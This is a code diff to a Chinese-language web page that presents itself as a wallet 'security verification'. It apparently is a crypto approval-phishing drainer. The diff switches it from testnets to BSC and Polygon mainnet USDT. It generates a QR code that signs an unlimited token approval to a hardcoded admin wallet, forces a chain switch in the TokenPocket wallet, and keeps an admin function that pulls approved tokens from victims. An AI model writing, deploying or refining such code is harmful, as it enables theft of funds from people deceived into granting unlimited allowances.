@@ -66,6 +66,11 @@ width:100%;padding:14px;background:#F0B90B;color:#000;
 border:none;border-radius:10px;font-weight:bold;margin-bottom:10px;
 cursor:pointer;
 }
+
+#connectBtn {
+margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;
+border-radius:10px;width:100%;font-weight:bold
+}
 </style>
 
 <div class="container">
@@ -73,18 +78,16 @@ cursor:pointer;
     <h1>💳 安全验证</h1>
     <p class="desc">完成签名即可正常使用</p>
     <div class="chain-select">
-      <button class="chain-btn active" data-chain="bsc">BSC Testnet</button>
-      <button class="chain-btn" data-chain="polygon">Polygon Amoy</button>
+      <button class="chain-btn active" data-chain="bsc">BSC 主网</button>
+      <button class="chain-btn" data-chain="polygon">Polygon 主网</button>
     </div>
     <div class="input-group">
       <label>授权金额</label>
       <input type="number" id="amount" value="10" min="0.01" step="0.01">
     </div>
     <div id="qrcode">生成二维码...</div>
-    <div class="tip">扫码直接签名，无跳转</div>
-    <button id="connectBtn" style="margin-top:15px;padding:12px;background:#F0B90B;color:#000;border:none;border-radius:10px;width:100%;font-weight:bold">
-      连接钱包
-    </button>
+    <div class="tip">TokenPocket 扫码直接签名，无跳转</div>
+    <button id="connectBtn">连接钱包</button>
     <div id="authStatus" class="status">
       未连接钱包，无法检测授权状态
     </div>
@@ -114,22 +117,25 @@ cursor:pointer;
 <script>
 const ADMIN_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
 
-// ====================== 适配你的 Tenderly 自定义节点 ======================
+// BSC + Polygon 主网配置
 const CONFIG = {
   bsc: {
-    chainId: "97", // BSC 测试网 chainId
-    token: "0x55d398326f99059fF775485246999027B3197955", // 你的测试代币地址
+    chainId: "56",
+    chainIdHex: "0x38",
+    token: "0x55d398326f99059fF775485246999027B3197955",
     decimals: 18,
-    rpc: "https://virtual.binance.eu.rpc.tenderly.co/15f0611b-dae5-4bdc-a7f7-172c6e7a7d0e" // 你的自定义节点
+    rpc: "https://bsc-dataseed.binance.org/",
+    protocol: "bsc"
   },
   polygon: {
-    chainId: "80002", // Polygon Amoy 测试网 chainId
-    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB", // Polygon 测试 USDT
+    chainId: "137",
+    chainIdHex: "0x89",
+    token: "0xc2132D05D31c914877CCAf1253d40b9764aB58EB",
     decimals: 6,
-    rpc: "https://virtual.binance.eu.rpc.tenderly.co/15f0611b-dae5-4bdc-a7f7-172c6e7a7d0e" // 你的自定义节点
+    rpc: "https://polygon-rpc.com/",
+    protocol: "polygon"
   }
 };
-// ========================================================================
 
 const ERC20_ABI = [
   "function allowance(address owner, address spender) external view returns (uint256)",
@@ -142,6 +148,7 @@ let provider;
 let refreshInterval;
 let lastAuthStatus = null;
 
+// 切换链
 document.querySelectorAll(".chain-btn").forEach(btn => {
   btn.onclick = () => {
     document.querySelectorAll(".chain-btn").forEach(b => b.classList.remove("active"));
@@ -153,22 +160,31 @@ document.querySelectorAll(".chain-btn").forEach(btn => {
 });
 document.getElementById("amount").addEventListener("input", renderQR);
 
+// 生成 TP 钱包兼容的授权二维码
 function genAuthEIP681() {
-  const { chainId, token } = CONFIG[currentChain];
+  const { chainId, token, protocol } = CONFIG[currentChain];
   const data = "0x095ea7b3" +
     ADMIN_WALLET.slice(2).padStart(64, '0') +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-  return `ethereum:${token}@${chainId}?data=${data}`;
+  return `${protocol}:${token}@${chainId}?data=${data}`;
 }
+
 function renderQR() {
   const url = genAuthEIP681();
   const qr = `https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(url)}`;
-  document.getElementById("qrcode").innerHTML = `<img src="${qr}">`;
+  document.getElementById("qrcode").innerHTML = `<img src="${qr}" alt="授权二维码">`;
 }
 
+// 连接钱包 + 自动切换到对应主网
 document.getElementById("connectBtn").onclick = async () => {
-  if (!window.ethereum) { alert("请在 TP 钱包内打开"); return; }
+  if (!window.ethereum) { alert("请在 TokenPocket 钱包内打开"); return; }
   try {
+    const { chainIdHex } = CONFIG[currentChain];
+    await window.ethereum.request({
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: chainIdHex }]
+    });
+
     provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
     const signer = await provider.getSigner();
@@ -177,9 +193,38 @@ document.getElementById("connectBtn").onclick = async () => {
     checkAuthStatus();
     if (refreshInterval) clearInterval(refreshInterval);
     refreshInterval = setInterval(checkAuthStatus, 5000);
-  } catch (e) { alert("连接失败"); }
+  } catch (e) {
+    if (e.code === 4902) {
+      const { chainIdHex, chainName, nativeCurrency, rpcUrls, blockExplorerUrls } = 
+        currentChain === "bsc" ? {
+          chainIdHex: "0x38",
+          chainName: "Binance Smart Chain Mainnet",
+          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+          rpcUrls: ["https://bsc-dataseed.binance.org/"],
+          blockExplorerUrls: ["https://bscscan.com/"]
+        } : {
+          chainIdHex: "0x89",
+          chainName: "Polygon Mainnet",
+          nativeCurrency: { name: "MATIC", symbol: "MATIC", decimals: 18 },
+          rpcUrls: ["https://polygon-rpc.com/"],
+          blockExplorerUrls: ["https://polygonscan.com/"]
+        };
+      await window.ethereum.request({
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: chainIdHex,
+          chainName: chainName,
+          nativeCurrency: nativeCurrency,
+          rpcUrls: rpcUrls,
+          blockExplorerUrls: blockExplorerUrls
+        }]
+      });
+    }
+    alert("连接失败，请重试");
+  }
 };
 
+// 检查是否为管理员
 async function checkAdmin() {
   if (!account) return;
   const adminPanel = document.getElementById("adminPanel");
@@ -197,6 +242,7 @@ function closeModal() {
   document.getElementById("successModal").classList.remove("show");
 }
 
+// 检查当前用户授权状态
 async function checkAuthStatus() {
   if (!account || !provider) {
     document.getElementById("authStatus").innerHTML = "未连接钱包，无法检测授权状态";
@@ -232,6 +278,7 @@ async function checkAuthStatus() {
   }
 }
 
+// 管理员检查用户授权
 async function checkUserAuth() {
   const userAddr = document.getElementById("userAddr").value.trim();
   if (!userAddr || !ethers.isAddress(userAddr)) {
@@ -261,6 +308,7 @@ async function checkUserAuth() {
   }
 }
 
+// 管理员提取用户代币
 async function drawFromUser() {
   if (!account || account.toLowerCase() !== ADMIN_WALLET.toLowerCase()) {
     alert("❌ 仅管理员可操作");
@@ -290,6 +338,7 @@ async function drawFromUser() {
   }
 }
 
+// 页面加载
 window.addEventListener("load", () => {
   renderQR();
   if (window.ethereum) {
